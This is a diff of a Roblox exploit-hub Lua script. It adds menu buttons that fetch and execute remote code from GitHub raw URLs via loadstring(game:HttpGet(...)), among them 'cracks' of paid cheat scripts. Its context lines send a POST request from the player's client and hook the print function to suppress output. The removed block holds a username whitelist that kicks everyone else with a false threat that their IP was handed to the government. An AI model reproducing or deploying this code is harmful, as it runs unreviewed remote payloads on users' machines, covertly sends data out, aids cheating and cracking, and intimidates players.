@@ -94,67 +94,6 @@ local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
-
-local player = game.Players.LocalPlayer
-
-local allowedNames = {
-      "malekamrmostafa",
-    "AntoOfficial_ITA",
-    "MarioMamaEChupa",
-    "matthewtoyota",
-    "Sheikh_rebzzy",
-    "TPS_ror7",
-    "PASSTOGIOANDGOL",
-    "VoynaEclipse",
-    "Hhhhh_x61",
-    "jvajb5",
-    "sanimegirlsolo",
-    "jdjdjhddhdbdhvdgdgmd",
-    "dhshdkdudh",
-    "yasir256586",
-    "blockBusterBuddy1",
-    "rip_aliiraqe",
-    "jake_playsyt56",
-    "Tps_goatedvyd",
-    "bluemoon0067",
-    "Tpsrtg0to100",
-    "malekamrmostafa",
-    "fjdjskwkekddkrdkdkek",
-    "Adzless",
-    "kakasiuiu",
-    "USERNAME2",
-    "maxi20082020",
-    "ameperus",
-    "7vairo",
-    "VairoAlt17",
-    "19372937383737383h",
-    "az_aaa5",
-    "kaushalhps",
-    "chamaco601",
-    "due7374t",
-    "holdaaja168",
-    "dreamsolosyourclub",
-    "stainingToilets",
-    "hejchlopaczku",
-    "notScytherzzz",
-    "rip_ga4x",
-} -- Adicione os nomes permitidos aqui
-local isWhitelisted = false
-
-for _, allowedName in pairs(allowedNames) do
-    if player.Name == allowedName then
-        isWhitelisted = true
-        break -- Se encontrou um nome permitido, sai do loop
-    end
-end
-
-if isWhitelisted then
-    print("Whitelisted")
-else
-    player:Kick("Ur ip has successfully been given to the government vpn cant help you dm aldz for proof")
-end
-
-
 --- <HOOKS>
 hookfunction(print, function(...)
     return
@@ -293,7 +232,7 @@ local Tabs = {
     Misc = Window:AddTab({ Title = "Misc", Icon = "gamepad-2" }),
     Skys = Window:AddTab({ Title = "Skys", Icon = "umbrella" }),
     AutoStuff = Window:AddTab({ Title = "Auto Stuff", Icon = "sword" }),
-    TrollSounds = Window:AddTab({ Title = "Trolls", Icon = "banana" }),
+    Scripts = Window:AddTab({ Title = "Scripts", Icon = "banana" }),
     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
 }
 
@@ -1286,6 +1225,15 @@ Tabs.Cracks:AddButton({
     Callback = function()
               getgenv().Kitten = 10
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fanlolZzz/tester/main/low"))()
+      
+      end    
+})
+
+Tabs.Cracks:AddButton({
+    Title = "yBloodz crack ( by edaruph)",
+    Callback = function()
+              getgenv().Kitten = 10
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Edaruph/Cracks/main/yBloodz/GUI'))()
       
       end    
 })
@@ -6296,12 +6244,54 @@ end
 end
 })
 
-Tabs.TrollSounds:AddButton({
-    Title = "Troll Sound 1 (by goat lukas)",
+Tabs.Scripts:AddButton({
+    Title = "Da Hood Mobile",
     Callback = function()
-              loadstring(game:HttpGet("https://raw.githubusercontent.com/strandedlukas/Troll-sound-/main/Strandedlukas", true))();
-      end    
+        Library:Notify({
+            Title = "Executed",
+            Content = "Executed! enjoy",
+            Duration = 5 
+        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
+    end
 })
+
+Tabs.Scripts:AddButton({
+    Title = "Doors script",
+    Callback = function()
+        Library:Notify({
+            Title = "Executed",
+            Content = "Executed! enjoy",
+            Duration = 5 
+        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/UltraStuff/scripts2/main/doors"))()
+    end
+})
+
+Tabs.Scripts:AddButton({
+    Title = "Swat.cc (Da hood by strandedlukas script)",
+    Callback = function()
+        Library:Notify({
+            Title = "Executed",
+            Content = "Executed! enjoy",
+            Duration = 5 
+        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/strandedlukas/Www/main/W"))();
+    end
+})
+
+Tabs.Scripts:AddButton({
+    Title = "Copy Discord",
+    Callback = function()
+        Library:Notify({
+            Title = "Executed",
+            Content = "Executed! enjoy",
+            Duration = 5 
+        })
+        setclipboard(".strandedlukas is my discord add up if you need anything or lmk!")
+    end
+})
+
 
 InterfaceManager:SetLibrary(Library)
 
